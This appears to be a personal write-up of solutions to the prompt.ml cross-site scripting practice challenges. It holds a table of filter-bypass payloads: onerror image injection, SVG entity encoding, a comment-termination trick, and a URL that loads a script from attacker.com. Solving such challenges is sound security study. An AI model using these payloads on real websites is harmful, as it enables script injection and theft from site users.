# Solving and Creating XSS Challenges

## Legend

Symbol/Abbr. | Description
-------------|------------
✔ | Finished
❌ | Rejected / Not done

## Charters

### 1

Do all of [prompt](http://prompt.ml/) challenges

#### Note

Challenge | Solution | Comment | Solved
----------|----------|---------|-------
0 | `"/><img src=x onerror="prompt(1)` | | ✔
1 | `<img src=x onerror=prompt(1) /` | Interpreted as `<img src="x" onerror="prompt(1)" <="" article="">` probably because `../</article>` is turned into `<="" article=""` | ✔
2 | `<svg><script>prompt&#40;1)</script>` | The magic of this level's solution is once again caused by SVG. This time not only because it is useful to shorten the attack vector but also due to its XML-ish nature. This means that once we use entities inside an SVG's <script> element (or any other CDATA element), they will be parsed as if they were used in canonical representation. Therefore, to bypass the filter, the solution is to call prompt(1) with the open parenthesis char ( encoded, i.e. &#x28; or even shorter &#40;. One can also use &lpar; of course. | ❌
3 | `--!><img src=x onerror=prompt(1) /` `--!><script>prompt(1)</script` | Although the character sequence --!> raises a Parse error, the HTML Specifications defines the tokenization that makes it an alternative to end a comment | ✔
4 | `http://prompt.ml%2f:pswd@attacker.com/xss.js` | Th trick is to use HTTPAuth part to bypass the regex and `%2f` representing the `/` | ❌
